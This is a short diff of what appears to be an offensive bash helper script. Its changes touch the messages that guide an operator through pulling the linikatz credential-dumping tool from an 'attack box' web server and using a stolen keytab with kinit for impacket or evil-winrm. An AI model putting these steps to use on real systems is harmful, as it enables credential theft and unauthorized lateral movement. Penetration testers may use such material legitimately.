@@ -58,11 +58,11 @@ get_linikatz() {
         2)
             echo "Setup instructions:"
             echo "  1) Download linikatz.sh to your attack box"
-            echo "  2) Host it: python3 -m http.server 8000"
+            echo "  2) Host it: (with python3 -m http.server 8000)"
             echo "  3) Enter your attack box details below"
             echo
             read -p "Enter your attack box IP: " ip
-            [ -z "$ip" ] && { print_error "IP required for local download"; return 1; }
+            [ -z "$ip" ] && { print_error "IP required for local download -_-"; return 1; }
             
             read -p "Enter port (default 8000): " port
             port=${port:-8000}
@@ -77,7 +77,7 @@ get_linikatz() {
                 return 0
             else
                 print_error "Failed to download from attack box"
-                print_error "Make sure linikatz.sh is in your web server directory"
+                print_error "Make sure linikatz.sh is in your root web server directory and you provided the right IP and PORT"
                 return 1
             fi
             ;;
@@ -189,7 +189,7 @@ use_keytab() {
     if kinit "$principal" -k -t "$ktfile"; then
         print_status "Successfully obtained Kerberos ticket!"
         klist 2>/dev/null
-        print_status "Ready for impacket tools (-k flag) or evil-winrm"
+        print_status "Ready for impacket tools or evil-winrm"
     else
         print_error "Failed to obtain ticket from keytab"
         print_warning "Try manually: export KRB5CCNAME=FILE:/tmp/ticket && kinit $principal -k -t $ktfile"
